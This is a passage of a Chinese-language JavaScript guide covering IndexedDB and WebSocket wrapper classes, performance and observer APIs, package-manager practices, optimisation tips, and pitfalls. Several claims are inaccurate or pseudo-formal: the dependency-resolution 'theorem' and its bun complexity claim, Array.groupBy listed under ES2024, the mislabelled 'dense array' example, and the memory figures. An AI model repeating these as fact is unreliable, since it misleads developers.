#### 3.5.3 IndexedDB 完整封装

```javascript
// indexeddb-wrapper.js
class IndexedDBWrapper {
  constructor(dbName, version) {
    this.dbName = dbName;
    this.version = version;
    this.db = null;
  }

  async open(stores) {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.version);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (e) => {
        const db = e.target.result;

        // 创建对象存储
        for (const [storeName, config] of Object.entries(stores)) {
          if (!db.objectStoreNames.contains(storeName)) {
            const store = db.createObjectStore(storeName, {
              keyPath: config.keyPath || 'id',
              autoIncrement: config.autoIncrement || false
            });

            // 创建索引
            for (const [indexName, indexConfig] of Object.entries(config.indexes || {})) {
              store.createIndex(indexName, indexConfig.keyPath, {
                unique: indexConfig.unique || false
              });
            }
          }
        }
      };
    });
  }

  async add(storeName, data) {
    return this.transaction(storeName, 'readwrite', (store) => {
      return store.add(data);
    });
  }

  async put(storeName, data) {
    return this.transaction(storeName, 'readwrite', (store) => {
      return store.put(data);
    });
  }

  async get(storeName, key) {
    return this.transaction(storeName, 'readonly', (store) => {
      return store.get(key);
    });
  }

  async delete(storeName, key) {
    return this.transaction(storeName, 'readwrite', (store) => {
      return store.delete(key);
    });
  }

  async getAll(storeName, query, count) {
    return this.transaction(storeName, 'readonly', (store) => {
      return store.getAll(query, count);
    });
  }

  async query(storeName, indexName, range) {
    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction(storeName, 'readonly');
      const store = transaction.objectStore(storeName);
      const index = store.index(indexName);
      const request = index.openCursor(range);

      const results = [];
      request.onsuccess = (e) => {
        const cursor = e.target.result;
        if (cursor) {
          results.push(cursor.value);
          cursor.continue();
        } else {
          resolve(results);
        }
      };
      request.onerror = () => reject(request.error);
    });
  }

  transaction(storeName, mode, operation) {
    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction(storeName, mode);
      const store = transaction.objectStore(storeName);
      const request = operation(store);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  close() {
    if (this.db) {
      this.db.close();
      this.db = null;
    }
  }
}

// 使用
const db = new IndexedDBWrapper('MyApp', 1);
await db.open({
  users: {
    keyPath: 'id',
    indexes: {
      email: { keyPath: 'email', unique: true },
      age: { keyPath: 'age' }
    }
  },
  documents: {
    keyPath: 'id',
    autoIncrement: true
  }
});

await db.add('users', { id: 1, name: 'Alice', email: 'alice@example.com', age: 30 });
const user = await db.get('users', 1);
const adults = await db.query('users', 'age', IDBKeyRange.lowerBound(18));
```

---

### 3.6 WebSocket

#### 3.6.1 完整客户端实现

```javascript
// websocket-client.js
class WebSocketClient {
  constructor(url, options = {}) {
    this.url = url;
    this.options = {
      reconnectInterval: 1000,
      maxReconnectAttempts: 5,
      heartbeatInterval: 30000,
      ...options
    };

    this.ws = null;
    this.reconnectAttempts = 0;
    this.heartbeatTimer = null;
    this.listeners = new Map();
    this.messageQueue = [];
  }

  connect() {
    return new Promise((resolve, reject) => {
      try {
        this.ws = new WebSocket(this.url);

        this.ws.onopen = () => {
          console.log('WebSocket connected');
          this.reconnectAttempts = 0;
          this.startHeartbeat();
          this.flushMessageQueue();
          this.emit('open');
          resolve();
        };

        this.ws.onmessage = (e) => {
          this.handleMessage(e.data);
        };

        this.ws.onclose = (e) => {
          console.log('WebSocket closed:', e.code, e.reason);
          this.stopHeartbeat();
          this.emit('close', e);

          if (!e.wasClean && this.reconnectAttempts < this.options.maxReconnectAttempts) {
            this.scheduleReconnect();
          }
        };

        this.ws.onerror = (error) => {
          console.error('WebSocket error:', error);
          this.emit('error', error);
          reject(error);
        };

      } catch (error) {
        reject(error);
      }
    });
  }

  send(data) {
    const message = typeof data === 'string' ? data : JSON.stringify(data);

    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(message);
    } else {
      this.messageQueue.push(message);
    }
  }

  flushMessageQueue() {
    while (this.messageQueue.length > 0) {
      const message = this.messageQueue.shift();
      this.ws.send(message);
    }
  }

  handleMessage(data) {
    try {
      const message = JSON.parse(data);
      this.emit('message', message);

      // 处理特定类型消息
      if (message.type) {
        this.emit(message.type, message.payload);
      }
    } catch {
      this.emit('message', data);
    }
  }

  startHeartbeat() {
    this.heartbeatTimer = setInterval(() => {
      this.send({ type: 'ping', timestamp: Date.now() });
    }, this.options.heartbeatInterval);
  }

  stopHeartbeat() {
    if (this.heartbeatTimer) {
      clearInterval(this.heartbeatTimer);
      this.heartbeatTimer = null;
    }
  }

  scheduleReconnect() {
    this.reconnectAttempts++;
    const delay = this.options.reconnectInterval * Math.pow(2, this.reconnectAttempts - 1);

    console.log(`Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`);

    setTimeout(() => this.connect(), delay);
  }

  on(event, handler) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event).add(handler);
  }

  off(event, handler) {
    this.listeners.get(event)?.delete(handler);
  }

  emit(event, ...args) {
    this.listeners.get(event)?.forEach(handler => {
      try {
        handler(...args);
      } catch (error) {
        console.error('Event handler error:', error);
      }
    });
  }

  close(code = 1000, reason = '') {
    this.stopHeartbeat();
    this.ws?.close(code, reason);
  }
}

// 使用
const ws = new WebSocketClient('wss://api.example.com/ws');

ws.on('open', () => {
  ws.send({ type: 'subscribe', channel: 'updates' });
});

ws.on('message', (data) => {
  console.log('Received:', data);
});

ws.on('update', (payload) => {
  console.log('Update:', payload);
});

await ws.connect();
```

#### 3.6.2 WebSocket vs HTTP 对比

| 特性 | HTTP/1.1 | HTTP/2 | WebSocket |
|------|----------|--------|-----------|
| 连接 | 短连接/Keep-Alive | 多路复用 | 长连接 |
| 通信模式 | 请求-响应 | 请求-响应 | 全双工 |
| 头部开销 | 每次请求 | HPACK 压缩 | 初始握手后无头部 |
| 服务器推送 | ❌ | ✅ (Server Push) | ✅ |
| 实时性 | 轮询延迟 | 较好 | 最佳 |
| 适用场景 | REST API | 多资源加载 | 实时通信 |

---

### 3.7 Performance API

#### 3.7.1 性能时间线

```javascript
// 获取所有性能条目
const entries = performance.getEntries();

// 特定类型条目
const navigation = performance.getEntriesByType('navigation')[0];
const resources = performance.getEntriesByType('resource');
const paints = performance.getEntriesByType('paint');

// 关键时间指标
const timing = {
  // DNS 查询时间
  dns: navigation.domainLookupEnd - navigation.domainLookupStart,

  // TCP 连接时间
  tcp: navigation.connectEnd - navigation.connectStart,

  // SSL 握手时间
  ssl: navigation.secureConnectionStart > 0
    ? navigation.connectEnd - navigation.secureConnectionStart
    : 0,

  // 首字节时间 (TTFB)
  ttfb: navigation.responseStart - navigation.startTime,

  // DOM 解析时间
  domParse: navigation.domInteractive - navigation.responseEnd,

  // DOM 就绪时间
  domReady: navigation.domContentLoadedEventEnd - navigation.startTime,

  // 页面完全加载时间
  loadComplete: navigation.loadEventEnd - navigation.startTime
};

console.log('Performance timing:', timing);
```

#### 3.7.2 性能观察器

```javascript
// 观察 LCP (Largest Contentful Paint)
const lcpObserver = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1];
  console.log('LCP:', lastEntry.startTime);
});
lcpObserver.observe({ entryTypes: ['largest-contentful-paint'] });

// 观察 CLS (Cumulative Layout Shift)
let clsValue = 0;
const clsObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (!entry.hadRecentInput) {
      clsValue += entry.value;
    }
  }
  console.log('CLS:', clsValue);
});
clsObserver.observe({ entryTypes: ['layout-shift'] });

// 观察 FID (First Input Delay)
const fidObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    const delay = entry.processingStart - entry.startTime;
    console.log('FID:', delay);
  }
});
fidObserver.observe({ entryTypes: ['first-input'] });

// 观察资源加载
const resourceObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log(`Resource: ${entry.name}, Duration: ${entry.duration}ms`);
  }
});
resourceObserver.observe({ entryTypes: ['resource'] });

// 自定义标记和测量
performance.mark('start-operation');
// ... 执行操作
performance.mark('end-operation');

performance.measure('operation-duration', 'start-operation', 'end-operation');

const measure = performance.getEntriesByName('operation-duration')[0];
console.log('Operation took:', measure.duration, 'ms');
```

#### 3.7.3 性能预算监控

```javascript
// performance-budget.js
const budgets = {
  'script.js': { size: 50000, time: 100 },      // 50KB, 100ms
  'style.css': { size: 20000, time: 50 },       // 20KB, 50ms
  'api/data': { time: 200 }                      // 200ms
};

function checkBudgets() {
  const resources = performance.getEntriesByType('resource');

  for (const resource of resources) {
    const budget = budgets[resource.name];
    if (!budget) continue;

    // 检查大小预算
    if (budget.size && resource.transferSize > budget.size) {
      console.warn(
        `Size budget exceeded: ${resource.name}`,
        `Transfer: ${resource.transferSize}B, Budget: ${budget.size}B`
      );
    }

    // 检查时间预算
    if (budget.time && resource.duration > budget.time) {
      console.warn(
        `Time budget exceeded: ${resource.name}`,
        `Duration: ${resource.duration}ms, Budget: ${budget.time}ms`
      );
    }
  }
}

window.addEventListener('load', checkBudgets);
```

---

### 3.8 Observer APIs

#### 3.8.1 Intersection Observer（可见性观察）

```javascript
// 懒加载图片
const imageObserver = new IntersectionObserver((entries) => {
  for (const entry of entries) {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.classList.add('loaded');
      imageObserver.unobserve(img);
    }
  }
}, {
  root: null,              // 视口
  rootMargin: '50px',      // 提前 50px 加载
  threshold: 0.01          // 1% 可见即触发
});

document.querySelectorAll('img[data-src]').forEach(img => {
  imageObserver.observe(img);
});

// 无限滚动
const sentinel = document.querySelector('#scroll-sentinel');
const scrollObserver = new IntersectionObserver((entries) => {
  for (const entry of entries) {
    if (entry.isIntersecting) {
      loadMoreItems();
    }
  }
});
scrollObserver.observe(sentinel);
```

#### 3.8.2 Mutation Observer（DOM 变化观察）

```javascript
const target = document.getElementById('observed-element');

const observer = new MutationObserver((mutations) => {
  for (const mutation of mutations) {
    switch (mutation.type) {
      case 'childList':
        console.log('Children changed:');
        console.log('  Added:', mutation.addedNodes);
        console.log('  Removed:', mutation.removedNodes);
        break;

      case 'attributes':
        console.log(`Attribute ${mutation.attributeName} changed`);
        console.log('  Old value:', mutation.oldValue);
        break;

      case 'characterData':
        console.log('Text content changed');
        break;
    }
  }
});

observer.observe(target, {
  childList: true,           // 观察子节点变化
  attributes: true,          // 观察属性变化
  characterData: true,       // 观察文本内容变化
  subtree: true,             // 观察后代节点
  attributeOldValue: true,   // 记录旧属性值
  characterDataOldValue: true // 记录旧文本值
});

// 停止观察
observer.disconnect();
```

#### 3.8.3 Resize Observer（尺寸变化观察）

```javascript
const resizeObserver = new ResizeObserver((entries) => {
  for (const entry of entries) {
    const { width, height } = entry.contentRect;
    console.log(`Element resized: ${width}x${height}`);

    // 响应式调整
    if (width < 600) {
      entry.target.classList.add('mobile');
    } else {
      entry.target.classList.remove('mobile');
    }
  }
});

// 观察元素内容尺寸变化
resizeObserver.observe(document.querySelector('.responsive-container'));
```

---


## 4. 最佳实践与性能优化

### 4.1 包管理器最佳实践

#### 4.1.1 依赖版本锁定策略

```
形式化版本策略：

设 P 为项目，D 为依赖集合
对于每个 d ∈ D，版本约束 C(d) 的选择：

1. 精确版本: C(d) = "1.2.3"
   - 优点: 完全确定
   - 缺点: 无法获得补丁更新

2. 波浪号: C(d) = "~1.2.3" → [1.2.3, 1.3.0)
   - 优点: 自动获得补丁更新
   - 缺点: 次要版本可能引入 breaking changes

3. 插入号: C(d) = "^1.2.3" → [1.2.3, 2.0.0)
   - 优点: 自动获得新功能
   - 缺点: 主要版本升级可能不兼容

4. 范围: C(d) = ">=1.2.3 <2.0.0"
   - 优点: 精确控制
   - 缺点: 需要手动维护

推荐策略：
- 生产依赖: ^major.minor.patch
- 开发依赖: ~major.minor.patch
- 关键依赖: exact version
```

#### 4.1.2 Monorepo 工作区配置

```json
// package.json (root)
{
  "name": "monorepo",
  "private": true,
  "workspaces": [
    "packages/*",
    "apps/*"
  ],
  "scripts": {
    "build": "turbo run build",
    "test": "turbo run test",
    "lint": "turbo run lint",
    "changeset": "changeset",
    "version-packages": "changeset version",
    "release": "turbo run build && changeset publish"
  },
  "devDependencies": {
    "@changesets/cli": "^2.27.0",
    "turbo": "^1.12.0"
  }
}

// turbo.json
{
  "$schema": "https://turbo.build/schema.json",
  "globalDependencies": ["**/.env.*local"],
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**", ".next/**"]
    },
    "test": {
      "dependsOn": ["build"],
      "outputs": ["coverage/**"]
    },
    "lint": {
      "outputs": []
    },
    "dev": {
      "cache": false,
      "persistent": true
    }
  }
}
```

#### 4.1.3 依赖安全审计

```bash
# npm 安全审计
npm audit                    # 检查已知漏洞
npm audit fix               # 自动修复
npm audit fix --force       # 强制修复（可能破坏）

# 使用 Snyk
npx snyk test               # 测试项目
npx snyk wizard             # 交互式修复

# 依赖许可证检查
npx license-checker --summary

# 检查未使用的依赖
npx depcheck
```

### 4.2 ECMAScript 性能优化

#### 4.2.1 对象操作优化

```javascript
// 1. 隐藏类优化
// ✅ 一致的属性顺序和类型
class Point {
  constructor(x, y) {
    this.x = x;  // 先定义 x
    this.y = y;  // 再定义 y
  }
}

// ❌ 避免动态添加属性
const p = new Point(1, 2);
p.z = 3;  // 创建新的隐藏类

// 2. 使用对象池
class ObjectPool {
  constructor(factory, reset, size = 100) {
    this.factory = factory;
    this.reset = reset;
    this.pool = Array(size).fill(null).map(() => factory());
    this.available = [...this.pool];
  }

  acquire() {
    return this.available.pop() || this.factory();
  }

  release(obj) {
    this.reset(obj);
    this.available.push(obj);
  }
}

// 使用
const particlePool = new ObjectPool(
  () => ({ x: 0, y: 0, vx: 0, vy: 0 }),
  (p) => { p.x = p.y = p.vx = p.vy = 0; }
);

// 3. 避免 delete 操作
// ❌ 使用 delete
const obj = { a: 1, b: 2 };
delete obj.a;  // 降级为字典模式

// ✅ 使用 null
obj.a = null;  // 保持隐藏类
```

#### 4.2.2 数组性能优化

```javascript
// 1. 预分配数组
// ❌ 动态扩容
const arr1 = [];
for (let i = 0; i < 1000; i++) {
  arr1.push(i);
}

// ✅ 预分配
const arr2 = new Array(1000);
for (let i = 0; i < 1000; i++) {
  arr2[i] = i;
}

// 2. 使用 TypedArray 处理数值
// ❌ 普通数组
const numbers1 = new Array(1000000).fill(0).map((_, i) => i);

// ✅ TypedArray
const numbers2 = new Int32Array(1000000);
for (let i = 0; i < 1000000; i++) {
  numbers2[i] = i;
}

// 内存对比：32MB vs 4MB

// 3. 避免稀疏数组
// ❌ 稀疏数组（哈希表存储）
const sparse = [];
sparse[0] = 1;
sparse[10000] = 2;  // 内部转为字典模式

// ✅ 密集数组
const dense = new Array(10001);
dense[0] = 1;
dense[10000] = 2;
```

#### 4.2.3 函数优化

```javascript
// 1. 函数内联优化
// ✅ 简单函数容易被内联
function add(a, b) {
  return a + b;
}

// ❌ 复杂函数难以内联
function complex(a, b) {
  try {
    return a + b;
  } catch (e) {
    return 0;
  }
}

// 2. 避免 arguments 对象
// ❌ 使用 arguments
function sum1() {
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}

// ✅ 使用剩余参数
function sum2(...numbers) {
  return numbers.reduce((a, b) => a + b, 0);
}

// 3. 防抖和节流
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

function throttle(fn, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

// 使用
const handleResize = debounce(() => {
  console.log('Resized');
}, 250);

window.addEventListener('resize', handleResize);
```

### 4.3 Web APIs 性能优化

#### 4.3.1 DOM 操作优化

```javascript
// 1. 批量 DOM 操作
// ❌ 多次重排
const list = document.getElementById('list');
for (let i = 0; i < 1000; i++) {
  const item = document.createElement('li');
  item.textContent = `Item ${i}`;
  list.appendChild(item);  // 每次触发重排
}

// ✅ 使用 DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const item = document.createElement('li');
  item.textContent = `Item ${i}`;
  fragment.appendChild(item);
}
list.appendChild(fragment);  // 单次重排

// 2. 使用 requestAnimationFrame
function smoothAnimation() {
  let start = null;
  const duration = 1000;

  function step(timestamp) {
    if (!start) start = timestamp;
    const progress = (timestamp - start) / duration;

    element.style.transform = `translateX(${progress * 100}px)`;

    if (progress < 1) {
      requestAnimationFrame(step);
    }
  }

  requestAnimationFrame(step);
}

// 3. 虚拟滚动
class VirtualScroller {
  constructor(container, itemHeight, totalItems, renderItem) {
    this.container = container;
    this.itemHeight = itemHeight;
    this.totalItems = totalItems;
    this.renderItem = renderItem;

    this.visibleCount = Math.ceil(container.clientHeight / itemHeight);
    this.buffer = 5;  // 上下缓冲区

    this.setup();
  }

  setup() {
    // 设置总高度
    const totalHeight = this.totalItems * this.itemHeight;
    this.container.style.height = `${totalHeight}px`;

    // 创建可见区域容器
    this.viewport = document.createElement('div');
    this.container.appendChild(this.viewport);

    this.container.addEventListener('scroll', () => this.onScroll());
    this.onScroll();
  }

  onScroll() {
    const scrollTop = this.container.scrollTop;
    const startIndex = Math.max(0, Math.floor(scrollTop / this.itemHeight) - this.buffer);
    const endIndex = Math.min(
      this.totalItems,
      startIndex + this.visibleCount + this.buffer * 2
    );

    // 更新可见项
    this.viewport.innerHTML = '';
    this.viewport.style.transform = `translateY(${startIndex * this.itemHeight}px)`;

    for (let i = startIndex; i < endIndex; i++) {
      const item = this.renderItem(i);
      this.viewport.appendChild(item);
    }
  }
}
```

#### 4.3.2 网络请求优化

```javascript
// 1. 请求去重
class RequestDeduper {
  constructor() {
    this.pending = new Map();
  }

  async fetch(url, options = {}) {
    const key = `${url}:${JSON.stringify(options)}`;

    if (this.pending.has(key)) {
      return this.pending.get(key);
    }

    const promise = fetch(url, options)
      .finally(() => this.pending.delete(key));

    this.pending.set(key, promise);
    return promise;
  }
}

// 2. 预加载关键资源
const prefetcher = new RequestDeduper();

// 用户悬停时预加载
links.forEach(link => {
  link.addEventListener('mouseenter', () => {
    prefetcher.fetch(link.href);
  });
});

// 3. 使用 Cache API
async function cachedFetch(request) {
  const cache = await caches.open('api-cache');

  // 检查缓存
  const cached = await cache.match(request);
  if (cached) {
    // 后台更新
    fetch(request).then(response => {
      cache.put(request, response.clone());
    });
    return cached;
  }

  // 网络请求并缓存
  const response = await fetch(request);
  cache.put(request, response.clone());
  return response;
}
```

### 4.4 常见陷阱与反模式

#### 4.4.1 内存泄漏陷阱

```javascript
// 1. 闭包陷阱
// ❌ 内存泄漏
function createLeakyComponent() {
  const largeData = new Array(1000000).fill('data');

  return {
    process: function() {
      // largeData 被闭包引用，无法释放
      console.log('Processing...');
    }
  };
}

// ✅ 避免不必要的闭包
function createCleanComponent() {
  return {
    process: function(data) {
      // 数据通过参数传入
      console.log('Processing:', data);
    }
  };
}

// 2. 事件监听器未移除
// ❌ 内存泄漏
class Component {
  constructor() {
    window.addEventListener('resize', this.handleResize);
  }
}

// ✅ 正确移除
class CleanComponent {
  constructor() {
    this.handleResize = this.handleResize.bind(this);
    window.addEventListener('resize', this.handleResize);
  }

  destroy() {
    window.removeEventListener('resize', this.handleResize);
  }
}

// 3. 定时器未清理
// ❌ 内存泄漏
function startPolling() {
  setInterval(() => {
    fetchData();
  }, 5000);
}

// ✅ 清理定时器
function startCleanPolling() {
  const intervalId = setInterval(() => {
    fetchData();
  }, 5000);

  return () => clearInterval(intervalId);
}
```

#### 4.4.2 异步陷阱

```javascript
// 1. 未捕获的 Promise 错误
// ❌ 错误被吞没
fetch('/api/data')
  .then(data => process(data));
  // 没有 catch

// ✅ 总是处理错误
fetch('/api/data')
  .then(data => process(data))
  .catch(error => console.error(error));

// 2. async/await 中的并行处理
// ❌ 串行执行（慢）
async function fetchSerial() {
  const user = await fetchUser();
  const posts = await fetchPosts();  // 等待 user 完成
  const comments = await fetchComments();  // 等待 posts 完成
  return { user, posts, comments };
}

// ✅ 并行执行
async function fetchParallel() {
  const [user, posts, comments] = await Promise.all([
    fetchUser(),
    fetchPosts(),
    fetchComments()
  ]);
  return { user, posts, comments };
}

// 3. 循环中的 async
// ❌ 并行但无法控制
async function processItems(items) {
  items.forEach(async (item) => {  // forEach 不等待
    await process(item);
  });
  console.log('Done');  // 实际未完成
}

// ✅ 顺序执行
async function processItemsSequential(items) {
  for (const item of items) {
    await process(item);
  }
  console.log('Done');
}

// ✅ 并行但有控制
async function processItemsParallel(items, concurrency = 5) {
  const chunks = [];
  for (let i = 0; i < items.length; i += concurrency) {
    chunks.push(items.slice(i, i + concurrency));
  }

  for (const chunk of chunks) {
    await Promise.all(chunk.map(item => process(item)));
  }
  console.log('Done');
}
```

---

## 5. 形式化论证与总结

### 5.1 包管理器确定性定理

```
定理 5.1（确定性安装）：
给定 lock 文件 L 和包注册表 R，安装过程 Install(L, R) 是确定性的。

证明：
1. 设 L = {(pᵢ, vᵢ, hᵢ, uᵢ) | i ∈ [1,n]}，其中：
   - pᵢ: 包名
   - vᵢ: 版本
   - hᵢ: 内容哈希
   - uᵢ: 下载 URL

2. 对于每个 (p, v, h, u) ∈ L：
   a. 下载: download(u) → tarball
   b. 验证: verify(tarball, h) → boolean
   c. 安装: extract(tarball, path(p, v))

3. 由于：
   - u 是固定的（lock 文件确定）
   - h 是内容哈希（完整性验证）
   - path(p, v) 是确定性函数

   因此 Install(L, R) 的输出是确定的。

∎
```

### 5.2 模块解析算法复杂度

```
定理 5.2（依赖解析复杂度）：
设 n 为包数量，m 为依赖关系数。

npm v2/v3 嵌套解析: O(n²) 最坏情况
- 原因：每个包可能有自己的 node_modules

yarn/pnpm 扁平化解析: O(n log n)
- 原因：使用哈希表存储，排序处理冲突

bun 并行解析: O(n) 平均情况
- 原因：Zig 实现的并行 SAT 求解器

证明概要：
1. 依赖解析可规约为约束满足问题（CSP）
2. CSP 在最坏情况下是 NP-完全的
3. 但实际依赖图通常是稀疏的
4. 使用启发式算法（如 MRV）可将平均复杂度降至 O(n log n)

∎
```

### 5.3 JavaScript 引擎优化假设

```
假设 5.3（隐藏类优化）：
对于对象 O，如果满足以下条件：
1. 属性按相同顺序添加
2. 属性类型保持一致
3. 不删除属性
4. 不添加索引属性

则 V8 会为 O 创建稳定的隐藏类（Hidden Class），
使属性访问时间从 O(n) 降至 O(1)。

反例：
const a = { x: 1, y: 2 };  // 隐藏类 C1
const b = { y: 2, x: 1 };  // 隐藏类 C2（不同顺序）
const c = { x: 1 };        // 隐藏类 C3
c.y = 2;                   // 隐藏类 C4（动态添加）
delete c.x;                // 降级为字典模式

∎
```

---

## 附录

### A. 快速参考表

#### 包管理器命令对比

| 操作 | npm | yarn | pnpm | bun |
|------|-----|------|------|-----|
| 安装依赖 | `npm install` | `yarn` | `pnpm install` | `bun install` |
| 添加依赖 | `npm i pkg` | `yarn add pkg` | `pnpm add pkg` | `bun add pkg` |
| 添加开发依赖 | `npm i -D pkg` | `yarn add -D pkg` | `pnpm add -D pkg` | `bun add -d pkg` |
| 移除依赖 | `npm rm pkg` | `yarn remove pkg` | `pnpm remove pkg` | `bun remove pkg` |
| 运行脚本 | `npm run dev` | `yarn dev` | `pnpm dev` | `bun run dev` |
| 执行包 | `npx pkg` | `yarn dlx pkg` | `pnpm dlx pkg` | `bunx pkg` |
| 更新依赖 | `npm update` | `yarn upgrade` | `pnpm update` | `bun update` |
| 清理缓存 | `npm cache clean` | `yarn cache clean` | `pnpm store prune` | `bun pm cache rm` |

#### ECMAScript 版本特性

| 版本 | 年份 | 主要特性 |
|------|------|----------|
| ES5 | 2009 | 严格模式、JSON、Array 方法 |
| ES6/ES2015 | 2015 | let/const、箭头函数、类、模块、Promise |
| ES2016 | 2016 | 指数运算符、Array.prototype.includes |
| ES2017 | 2017 | async/await、Object.entries/values |
| ES2018 | 2018 | 展开运算符、Promise.finally |
| ES2019 | 2019 | Object.fromEntries、Array.flat |
| ES2020 | 2020 | BigInt、动态导入、Promise.allSettled |
| ES2021 | 2021 | 数字分隔符、Promise.any、逻辑赋值 |
| ES2022 | 2022 | 类私有字段、顶层 await、at() |
| ES2023 | 2023 | Array.findLast、Hashbang、toSorted |
| ES2024 | 2024 | Array.groupBy、Promise.withResolvers |

---

## 参考资源

1. **npm 文档**: <https://docs.npmjs.com/>
2. **Yarn 文档**: <https://yarnpkg.com/>
3. **pnpm 文档**: <https://pnpm.io/>
4. **Bun 文档**: <https://bun.sh/>
5. **ECMAScript 规范**: <https://tc39.es/ecma262/>
6. **MDN Web APIs**: <https://developer.mozilla.org/en-US/docs/Web/API>
7. **V8 博客**: <https://v8.dev/blog>

---

*文档生成时间: 2024年*
*版本: 1.0*
